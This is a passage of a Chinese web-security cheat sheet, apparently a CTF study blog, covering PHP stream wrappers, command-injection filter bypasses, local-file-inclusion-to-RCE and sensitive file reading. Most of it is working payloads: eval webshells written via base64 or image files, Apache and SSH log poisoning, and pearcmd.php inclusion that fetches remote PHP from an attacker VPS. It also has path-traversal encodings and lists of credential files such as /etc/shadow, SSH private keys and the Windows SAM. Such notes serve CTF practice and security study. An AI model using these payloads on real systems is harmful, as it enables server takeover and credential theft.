<code>base64：convert.base64-encode</code> <code>rot-13：string.rot13</code><br>扩展（绕过方式）：<a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p><h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>类似php:&#x2F;&#x2F;input，用户控制输入流 <code>data://text/plain;base64,Y2F0IC9mbGFn</code></p><h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>zip:&#x2F;&#x2F;可以访问压缩包里面的文件，当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行，从而实现任意代码执⾏。只需要是zip的压缩即可，后缀名可以任意更改</p><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><p>利用条件：<br> <code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压，与zip协议有些相似 </p><h4 id="netdoc"><a href="#netdoc" class="headerlink" title="netdoc:&#x2F;&#x2F;"></a>netdoc:&#x2F;&#x2F;</h4><p>在java中可以利用netdoc协议读取文件，可以简单认为部分代替了file协议，多用于ssrf</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE英文全称：remote command&#x2F;code execute（远程命令&#x2F;代码执行漏洞） 漏洞出现的原因：没有在输入口做输入处理。 我们常见的路由器、防火墙、入侵检测等设备的web管理界面上可能会提供给用户一个命令操作的web界面&#x2F;接口，如果此接口未做过滤&#x2F;有漏洞，攻击者有可能直接向服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p><h3 id="危险函数："><a href="#危险函数：" class="headerlink" title="危险函数："></a>危险函数：</h3><p>php：<code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>exec()</code><br>asp：<code>eval()</code><br>perl：<code>exec</code>、<code>system</code>、<code>qx//</code><br>python：<code>os.system()</code><br>go：<code>exec.Command()</code></p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Bash">more:        一页一页的显示档案内容<br>less:        与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:        从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:        查看尾几行<br><span class="hljs-built_in">nl</span>:                显示内容，顺便输出行号<br><span class="hljs-built_in">od</span>:                以二进制的方式读取档案内容<br>vi:                一种编辑器，这个也可以查看<br>vim:        一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:        文件排序并输出也可以查看内容<br><span class="hljs-built_in">uniq</span>:        可以查看 file -f:报错出具体内容 grep<br>strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br><span class="hljs-built_in">paste</span>        把每个文件以列对列的方式，一列列地加以合并<br>grep        grep &#123; flag.php打印有”&#123;“的一行<br>sed                一种编辑器，可以用sed -f flag.php读取flag<br></code></pre></td></tr></table></figure><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>使用<code>/**/</code>、<code>&lt;</code>、<code>&lt;&gt;</code>、<code>%20</code>、<code>%09</code>、<code>$IFS$9</code>、<code>$&#123;IFS&#125;</code>、<code>IFS</code>等</p><h4 id="过滤分隔符"><a href="#过滤分隔符" class="headerlink" title="过滤分隔符 &#x2F;"></a>过滤分隔符 &#x2F;</h4><p>利用<code>;</code>执行多条命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cd</span> xx;<span class="hljs-built_in">ls</span> -al</span><br></code></pre></td></tr></table></figure><h4 id="过滤运算符-和"><a href="#过滤运算符-和" class="headerlink" title="过滤运算符|和&amp;"></a>过滤运算符|和&amp;</h4><p>使用<code>;</code>或 <code>%0a</code></p><h4 id="过滤flag、php等字符"><a href="#过滤flag、php等字符" class="headerlink" title="过滤flag、php等字符"></a>过滤flag、php等字符</h4><h5 id="拼接字符串绕过"><a href="#拼接字符串绕过" class="headerlink" title="拼接字符串绕过"></a>拼接字符串绕过</h5><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=m=p%0an=hp%0acat$&#123;IFS&#125;flag.$m$n<br></code></pre></td></tr></table></figure><p>可以采取<code>ls -i + cat </code>find &#x2F; -inum id&#96;&#96;组合拳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">ls</span> -i   <span class="hljs-comment">#找出文件pid</span><br><span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`   <span class="hljs-comment">#find / -inum id返回此id对应的文件名（路径）</span><br></code></pre></td></tr></table></figure><h5 id="输出到另一个文件"><a href="#输出到另一个文件" class="headerlink" title="输出到另一个文件"></a>输出到另一个文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">printf</span> /fla &gt; /tmp/hello %26%26 <span class="hljs-built_in">printf</span> g &gt;&gt; /tmp/hello %26%26 <span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello`<br><span class="hljs-comment">#printf /fla &gt; /tmp/hello ----&gt; 将 /fla 写入/tmp/hello文件</span><br><span class="hljs-comment">#printf g &gt;&gt; /tmp/hello ----&gt; 将 g 追加写入/tmp/hello文件。目前/tmp/hello文件中的内容就是：/flag</span><br><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello` ----&gt; `<span class="hljs-built_in">cat</span> /tmp/hello` 会输入出 /flag，<span class="hljs-built_in">cat</span> 会读取 /flag ，即可得到flag。<br></code></pre></td></tr></table></figure><h5 id="编码绕过-写入文件"><a href="#编码绕过-写入文件" class="headerlink" title="编码绕过(写入文件)"></a>编码绕过(写入文件)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | <span class="hljs-built_in">base64</span> -d 1.php<br></code></pre></td></tr></table></figure><h5 id="单双引号绕过"><a href="#单双引号绕过" class="headerlink" title="单双引号绕过"></a>单双引号绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t fl<span class="hljs-string">&#x27;&#x27;</span>ag 或ca<span class="hljs-string">&quot;&quot;</span>t fl<span class="hljs-string">&quot;&quot;</span>ag<br></code></pre></td></tr></table></figure><h5 id="shell变量绕过-ca-t-fla-g或者ca-1t-fla-2g"><a href="#shell变量绕过-ca-t-fla-g或者ca-1t-fla-2g" class="headerlink" title="shell变量绕过 ca$@t fla$@g或者ca$1t fla$2g"></a>shell变量绕过 <code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></h5><h5 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t f\lag<br></code></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="花括号"><a href="#花括号" class="headerlink" title="花括号{}"></a>花括号{}</h5><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 <code>&#123;cat,flag&#125;</code></p><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h5><p><code>cat </code>ls&#96;&#96;相当于cat目录下所有文件</p><h5 id="非法变量"><a href="#非法变量" class="headerlink" title="非法变量"></a>非法变量</h5><p><a href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a_b.&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$var</span>);<br></code></pre></td></tr></table></figure><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p><p>传参 <code>?a[b.=system(&quot;ls&quot;);</code></p><h3 id="无参数-无数字字母RCE"><a href="#无参数-无数字字母RCE" class="headerlink" title="无参数&#x2F;无数字字母RCE"></a>无参数&#x2F;无数字字母RCE</h3><p>参考<a href="https://xz.aliyun.com/t/8107#toc-0%E3%80%81https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/8107#toc-0、https://xz.aliyun.com/t/9360</a></p><p>过滤system <code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code></p><h4 id="1-一些常用函数"><a href="#1-一些常用函数" class="headerlink" title="(1)一些常用函数"></a>(1)一些常用函数</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 打印字符串（可以用连接符）、数组、对象。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span> 扫描目录下的文件<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span> 返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span> 返回一包含本地数字及货币格式信息的数组<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span> 与current差不多<br>可以执行<span class="hljs-selector-tag">a</span>(<span class="hljs-selector-tag">b</span>(<span class="hljs-built_in">c</span>()))形式时，<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>()))) 读当前目录文件<br></code></pre></td></tr></table></figure><h4 id="2-读取文件函数"><a href="#2-读取文件函数" class="headerlink" title="(2)读取文件函数"></a>(2)读取文件函数</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">file_get_contents</span>() 把整个文件读入一个字符串中<br><span class="hljs-built_in">file</span>() 把整个文件读入一个数组中;<br><span class="hljs-built_in">readfile</span>() 读入一个文件并写入到输出缓冲;<br><span class="hljs-built_in">highlight_file</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">show_source</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">array_flip</span>() 将读取当前目录的键和值进行反转<br><span class="hljs-built_in">array_rand</span>() 随机输出键<br></code></pre></td></tr></table></figure><h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="图片马getshell"><a href="#图片马getshell" class="headerlink" title="图片马getshell"></a>图片马getshell</h3><p>条件：<br><code>allow_url_include=on</code><br><code>allow_url_fopen=on</code></p><p>图片马内容，会在当前目录下生成shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="临时文件-phpinfo条件竞争getshell、"><a href="#临时文件-phpinfo条件竞争getshell、" class="headerlink" title="临时文件+phpinfo条件竞争getshell、"></a>临时文件+phpinfo条件竞争getshell、</h3><p>基本没遇到过，写个思路以及别人的方法，遇到了再深入</p><p><a href="https://blog.csdn.net/qq_43576303/article/details/119105376">思路</a>：实质上是连续传输很大的字节到服务器导致删除文件有时间差，包含临时的&#x2F;tmp&#x2F;6字节长度文件名php </p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">脚本</a>：python2的脚本</p><h3 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h3><h4 id="apache日志文件"><a href="#apache日志文件" class="headerlink" title="apache日志文件"></a>apache日志文件</h4><p>条件：<br>apache日志文件路径已知，或配置文件路径已知，有可读权限</p><p>先看<code>/etc/init.d/httpd</code>或<code>/etc/httpd/conf/httpd.conf</code>找到log文件路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>payload：<br>?file=/usr/local/apache/logs/error_log<br>?file=/usr/local/apache/logs/access_log<br><br>?file=shell.php<br></code></pre></td></tr></table></figure><h4 id="ssh日志文件"><a href="#ssh日志文件" class="headerlink" title="ssh日志文件"></a>ssh日志文件</h4><p>条件<br>SSH日志路径已知，有可读权限</p><p>将ssh用户名写为php马，ssh自动写入<code>/var/log/auth.log</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@192.168.136.143</span><br><span class="language-xml"></span><br><span class="language-xml">payload：</span><br><span class="language-xml">?file=/var/log/auth.log</span><br></code></pre></td></tr></table></figure><h3 id="Session文件包含getshell"><a href="#Session文件包含getshell" class="headerlink" title="Session文件包含getshell"></a>Session文件包含getshell</h3><p>条件：<br><code>php&gt;=5.4</code><br><code>session.upload_progress.enable = on</code><br>已知<code>session.save_path</code></p><p>分为两种</p><ol><li>session.upload_progress.cleanup &#x3D; on</li></ol><p>文件会清空，需要条件竞争</p><ol><li>session.upload_progress.cleanup &#x3D; off</li></ol><p>文件不会清空，直接包含<code>session.save_path+session.upload_progress.prefix+session_id</code>文件</p><h3 id="pearcmd-php文件包含getshell"><a href="#pearcmd-php文件包含getshell" class="headerlink" title="pearcmd.php文件包含getshell"></a>pearcmd.php文件包含getshell</h3><p>条件<br>安装了pear扩展<br>已知<code>pearcmd.php</code>路径(默认路径是<code>/usr/local/lib/php/pearcmd.php</code>)<br><code>register_argc_argv=on</code>（只有开启了，<code>$_SERVER[&#39;argv&#39;]</code>才会生效。）</p><p>三种方法</p><p>config-create</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>install</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+install+</span>--installroot<span class="hljs-code">+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test.php<br></code></pre></td></tr></table></figure><p>download</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+download+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php<br></code></pre></td></tr></table></figure><p>具体参考：<a href="https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html">pearcmd文件包含getshell</a></p><h2 id="文件读取利用"><a href="#文件读取利用" class="headerlink" title="文件读取利用"></a>文件读取利用</h2><h3 id="常见读取的敏感文件路径"><a href="#常见读取的敏感文件路径" class="headerlink" title="常见读取的敏感文件路径"></a>常见读取的敏感文件路径</h3><p>参考<a href="https://www.buaq.net/go-161450.html">https://www.buaq.net/go-161450.html</a></p><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br></code></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/authorized_keys /</span><span class="hljs-operator">/</span>如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa /</span><span class="hljs-operator">/</span>ssh私钥,ssh公钥是id_rsa.pub<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_ras.keystore /</span><span class="hljs-operator">/</span>记录每个访问计算机用户的公钥<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/known_hosts  /</span><span class="hljs-regexp">/ssh会把每个访问过计算机的公钥(public key)都记录在~/</span>.ssh<span class="hljs-operator">/</span>known_hosts<span class="hljs-operator">。</span>当下次访问相同计算机时，<span class="hljs-type">OpenSSH会核对公钥</span><span class="hljs-operator">。</span>如果公钥不同，<span class="hljs-type">OpenSSH会发出警告，</span> 避免你受到<span class="hljs-type">DNS</span> <span class="hljs-type">Hijack之类的攻击</span><span class="hljs-operator">。</span><br><span class="hljs-regexp">/etc/</span>passwd <span class="hljs-comment">// 账户信息</span><br><span class="hljs-regexp">/etc/</span>shadow <span class="hljs-comment">// 账户密码文件</span><br><span class="hljs-regexp">/etc/</span>my.cnf <span class="hljs-comment">//mysql 配置文件</span><br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf <span class="hljs-comment">// Apache配置文件</span><br><span class="hljs-regexp">/etc/</span>redhat<span class="hljs-operator">-</span>release 系统版本 <br><span class="hljs-regexp">/root/</span>.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br><span class="hljs-regexp">/root/</span>.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mlocate/</span>mlocate.db <span class="hljs-comment">//全文件路径</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">*</span>(文件标识符)<br><span class="hljs-regexp">/proc/</span>mounts <span class="hljs-comment">//记录系统挂载设备</span><br><span class="hljs-regexp">/porc/</span>config.gz <span class="hljs-comment">//内核配置文件</span><br><span class="hljs-regexp">/porc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/cmdline /</span><span class="hljs-operator">/</span>当前进程的cmdline参数<br><span class="hljs-regexp">/proc/</span>sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br><span class="hljs-regexp">/proc/</span>pid<span class="hljs-operator">/</span>cmdline   则可以看到对应pid进程的完整命令行<span class="hljs-operator">。</span><br><span class="hljs-regexp">/proc/</span>net<span class="hljs-operator">/</span>fib_trie   内网<span class="hljs-type">IP</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>environ   环境变量<br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>loginuid   当前用户<br></code></pre></td></tr></table></figure><h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><p>可以进行fuzz</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url编码代替.或者/，如使用<span class="hljs-variable">%2</span>F代替/<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>二次编码(<span class="hljs-variable">%25</span>)<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>加入+<br>?filename<span class="hljs-operator">=</span>.+./.+./bin/redacted.dll<br><span class="hljs-variable">%00</span><br>?filename<span class="hljs-operator">=</span>.<span class="hljs-variable">%00</span>./file.php/etc/passwd<span class="hljs-variable">%00</span>.jpg<br>\<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>/windows/win.iniJava <br><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span> 安全模式绕过<br>?filename<span class="hljs-operator">=</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="Linux下的常见利用姿势"><a href="#Linux下的常见利用姿势" class="headerlink" title="Linux下的常见利用姿势"></a>Linux下的常见利用姿势</h3><h4 id="用户目录下的敏感文件"><a href="#用户目录下的敏感文件" class="headerlink" title="用户目录下的敏感文件"></a>用户目录下的敏感文件</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.bash_history</span> <br><span class="hljs-string">.zsh_history</span><br><span class="hljs-string">.psql_history</span><br><span class="hljs-string">.mysql_history</span><br><span class="hljs-string">.profile</span> <br><span class="hljs-string">.bashrc</span><br><span class="hljs-string">.gitconfig</span><br><span class="hljs-string">.viminfo</span><br><br>任意文件读取<span class="hljs-string">/etc/passwd</span><br>提取passwd第一列，即root等一系列用户名<br>读<span class="hljs-keyword">history</span>：<span class="hljs-string">/root/.bash_history</span><br>暴破所有用户的<span class="hljs-string">.bash_history</span>：<span class="hljs-string">/home/</span>§root§<span class="hljs-string">/.bash_history</span><br></code></pre></td></tr></table></figure><p>历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。 PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p><h4 id="全路径"><a href="#全路径" class="headerlink" title="全路径"></a>全路径</h4><p>mlocate.db数据库里存储了本地所有文件的配置信息<br><code>/var/lib/mlocate/mlocate.db</code>利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息<br><code>locate mlocate.db config</code><br><code>locate mlocate.db webapps</code><br><code>locate mlocate.db www</code> </p><p>获取到路径后可以进一步挖掘敏感信息和系统漏洞</p><h4 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h4><p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。读取WEB-INF&#x2F;web.xml，进一步读取class文件，反编译得到源码。读取war包，反编译获取源码。</p><h4 id="应用配置文件"><a href="#应用配置文件" class="headerlink" title="应用配置文件"></a>应用配置文件</h4><p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p><ul><li>java站点<br><code>/WEB-INF/web.xml</code><br><code>/WEB-INF/classes/applicationContext.xml</code><br> <code>/WEB-INF/classes/xxx/xxx/xxx.class</code><br><code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li><li>tomcat<br><code>/usr/local/tomcat/conf/tomcat-users.xml</code></li><li>nginx<br><code>/www/nginx/conf/nginx.conf</code> 